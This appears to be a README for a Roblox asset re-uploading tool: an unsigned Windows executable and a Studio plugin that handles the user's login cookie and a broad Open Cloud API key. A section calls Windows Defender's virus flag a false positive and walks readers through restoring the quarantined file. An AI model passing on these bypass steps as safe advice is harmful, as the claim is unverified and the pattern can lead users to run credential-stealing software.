# Nexus Asset Reuploader

[![Discord](https://img.shields.io/badge/Discord-Join%20our%20server-5865F2?logo=discord&logoColor=white)](https://discord.gg/j4NPfDwCtA)

Re-upload your Roblox **animations, audio, and images** to your own account or group and have the new asset IDs swapped into your place automatically. A clean desktop app + a lightweight Studio plugin.

**Need help? [Join our Discord](https://discord.gg/j4NPfDwCtA).**

## Download

**[Download the latest release](../../releases/latest)** → grab `NexusAssetReuploader-v1.0.zip`.

> Windows may show a SmartScreen warning on first run (the app isn't code-signed yet) — click **More info → Run anyway**.

## Windows flagged the download? (false positive)

Windows Defender / SmartScreen may warn that this app is "a virus or potentially unwanted software." **It is a false positive.** Nexus is a Go program that handles your Roblox API key and login cookie *locally* to upload assets — that pattern trips antivirus heuristics even though the code is clean and runs only on your machine. A scan finds no actual malware.

To run it:
1. If Windows blocks it after extracting: open **Windows Security → Virus & threat protection → Protection history**, find the Nexus item, and click **Allow** / **Restore**.
2. Or right-click `Nexus Asset Reuploader.exe` → **Properties** → tick **Unblock** → OK.
3. Confirm you have the genuine file: its **SHA-256 must match** the value on the release page (see "Verify your download" below).

The warning is being submitted to Microsoft for review, and a code-signed build is planned to remove it entirely.

## Install

1. Unzip the download anywhere.
2. Run **`Nexus Asset Reuploader.exe`**.
3. Copy **`NexusReuploader.rbxmx`** into `%LOCALAPPDATA%\Roblox\Plugins` and restart Roblox Studio.

## Setup (one time)

1. Create a Roblox **Open Cloud API key** at <https://create.roblox.com/dashboard/credentials>:
   - Permissions: `asset:read`, `asset:write`, `asset-permissions:write`
   - **Restrict by Creator: OFF**
2. Paste the key into the app, pick your target (your profile or a group), and Save.

The in-app **Setup & FAQ** tab has the full walkthrough with screenshots.

## Use

In Studio, open the **Nexus Reuploader** plugin, pick **Animation / Audio / Image**, and hit **Reupload**. New IDs swap into your place automatically; watch progress in the app's Activity console.

## Privacy & security

- Runs entirely on your PC and talks only to Roblox.
- Your API key and cookie are **encrypted at rest** (Windows DPAPI) and never leave your machine.
- Never share your API key with anyone.

## Verify your download

Each release lists a **SHA-256** checksum. To confirm your download wasn't tampered with:

```powershell
Get-FileHash .\NexusAssetReuploader-v1.0.zip -Algorithm SHA256
```

The result should match the value on the release page.

## Support

Join the Discord: <https://discord.gg/j4NPfDwCtA>
